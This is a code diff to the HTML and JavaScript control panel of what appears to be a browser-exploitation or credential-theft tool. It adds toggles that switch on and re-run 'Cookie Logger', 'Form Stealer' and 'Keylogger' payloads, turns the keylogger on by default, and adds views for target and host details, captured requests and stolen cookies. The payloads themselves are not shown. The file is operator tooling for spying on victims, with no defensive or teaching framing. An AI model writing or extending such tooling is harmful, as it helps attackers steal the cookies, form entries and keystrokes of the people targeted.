@@ -460,18 +460,18 @@
         <div class="payload-grid">
             <div class="payload-card">
                 <h3>Cookie Logger</h3>
-                <p>Status: Active</p>
-                <p>Logs cookies every 5 seconds</p>
+                <p>Status: <span id="cookieLogger-status">Active</span></p>
+                <button onclick="togglePayload('cookieLogger')" class="action-button">Toggle</button>
             </div>
             <div class="payload-card">
                 <h3>Form Stealer</h3>
-                <p>Status: Active</p>
-                <p>Captures form submissions</p>
+                <p>Status: <span id="formStealer-status">Active</span></p>
+                <button onclick="togglePayload('formStealer')" class="action-button">Toggle</button>
             </div>
             <div class="payload-card">
                 <h3>Keylogger</h3>
-                <p>Status: Inactive</p>
-                <p>Captures keystrokes</p>
+                <p>Status: <span id="keyLogger-status">Active</span></p>
+                <button onclick="togglePayload('keyLogger')" class="action-button">Toggle</button>
             </div>
         </div>
     </div>
@@ -485,7 +485,7 @@
     <div id="requests" class="main-content">
         <h2>Request History</h2>
         <button onclick="clearHistory()" class="action-button">Clear History</button>
-        <div class="request-list" id="request-list"></div>
+        <div id="request-list"></div>
     </div>
 
     <div id="settings" class="main-content">
@@ -499,16 +499,32 @@
 </div>
 
 <script>
-    function showSection(sectionId) {
-        const sections = document.querySelectorAll('.main-content');
-        sections.forEach(section => {
-            section.style.display = 'none';
-        });
-
-        const selectedSection = document.getElementById(sectionId);
-        if (selectedSection) {
-            selectedSection.style.display = 'block';
+    function showSection(section) {
+        document.querySelectorAll('.main-content').forEach(el => el.style.display = 'none');
+        document.getElementById(section).style.display = 'block';
+        
+        if (section === 'server') {
+            updateServerInfo();
+        } else if (section === 'requests') {
+            updateRequests();
+        } else if (section === 'cookies') {
+            updateCookies();
         }
+    }
+
+    function updateServerInfo() {
+        // Get the current path without the leading slash
+        const currentPath = window.location.pathname.substring(1);
+        document.getElementById('secret-path').textContent = currentPath;
+        
+        fetch('/ep/api/serverInfo')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('target-info').textContent = data.target || 'Not set';
+                document.getElementById('host-info').textContent = data.host || 'Not set';
+                document.getElementById('port-info').textContent = data.port || 'Not set';
+            })
+            .catch(error => console.error('Error fetching server info:', error));
     }
 
     function copyPath() {
@@ -853,7 +869,7 @@
                 const requestList = document.getElementById('request-list');
                 requestList.innerHTML = '';
                 
-                requests.forEach(req => {
+                requests.reverse().forEach(req => {
                     const item = document.createElement('div');
                     item.className = 'request-item';
                     const methodClass = `method-${req.method}`;
@@ -921,6 +937,18 @@
 
     function hideCookies() {
         document.getElementById('cookie-list').style.display = 'none';
+    }
+
+    function togglePayload(payloadName) {
+        PayloadManager.config[payloadName] = !PayloadManager.config[payloadName];
+        const status = document.getElementById(`${payloadName}-status`);
+        status.textContent = PayloadManager.config[payloadName] ? 'Active' : 'Inactive';
+        status.style.color = PayloadManager.config[payloadName] ? '#4CAF50' : '#f44336';
+        
+        // Reinitialize payload if enabled
+        if (PayloadManager.config[payloadName]) {
+            PayloadManager.payloads[payloadName]();
+        }
     }
 
     // Initialize
